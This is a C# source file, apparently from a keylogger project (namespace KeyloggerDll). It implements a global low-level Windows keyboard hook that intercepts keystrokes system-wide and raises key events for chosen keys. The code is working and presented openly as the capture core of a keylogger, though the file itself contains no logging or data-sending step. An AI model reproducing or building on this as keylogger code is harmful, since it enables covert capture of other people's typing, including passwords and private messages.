using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyloggerDll
{
    internal class Utilities
    {
        public delegate int keyboardHookProc(int code, int wParam, ref Utilities.keyboardHookStruct lparam);
        public struct keyboardHookStruct
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public int dwExtraInfo;
        }

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 256;
        private const int WM_KEYUP = 257;
        private const int WM_SYSKEYDOWN = 260;
        private const int WM_SYSKEYUP = 261;

        public List<Keys> HookedKeys = new List<Keys>();


        private IntPtr hhook = IntPtr.Zero;
        private Utilities.keyboardHookProc hookProcDelegate;
        public event KeyEventHandler KeyDown;
        public event KeyEventHandler Keyup;

        public Utilities()
        {
            this.hookProcDelegate = new Utilities.keyboardHookProc(this.hookProc);
            this.hook();

        }

        ~Utilities()
        {
            this.unhook();
        }

        public void hook()
        {

            IntPtr hInstance = Utilities.LoadLibrary("User32");
            this.hhook = Utilities.SetWindowsHookEx(13, this.hookProcDelegate, hInstance, 0u);


        }
        public void unhook()
        {

            Utilities.UnhookWindowsHookEx(this.hhook);

        }
      
        public int hookProc(int code, int wParam, ref Utilities.keyboardHookStruct lparam)
        {

            int outcome;
            if (code >= 0)
            {
                Keys vkCode = (Keys)lparam.vkCode;
                if (this.HookedKeys.Contains(vkCode))
                {
                    KeyEventArgs keyEventArgs = new KeyEventArgs(vkCode);
                    if ((wParam == 256 || wParam == 260) && this.KeyDown != null)
                    {
                        this.KeyDown(this, keyEventArgs);


                    }
                    else
                    {
                        if ((wParam == 257 || wParam == 261) && this.Keyup != null)
                        {
                            this.Keyup(this, keyEventArgs);


                        }
                    }
                    if (keyEventArgs.Handled)
                    {
                        outcome = 1;
                        return outcome;

                    }

                }
            }
            outcome = Utilities.CallNextHookEx(this.hhook, code, wParam, ref lparam);
            return outcome;

        }
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, Utilities.keyboardHookProc callback, IntPtr hInstance, uint threadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hInstance);
        [DllImport("user32.dll")]
        private static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref Utilities.keyboardHookStruct lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);
    }
}
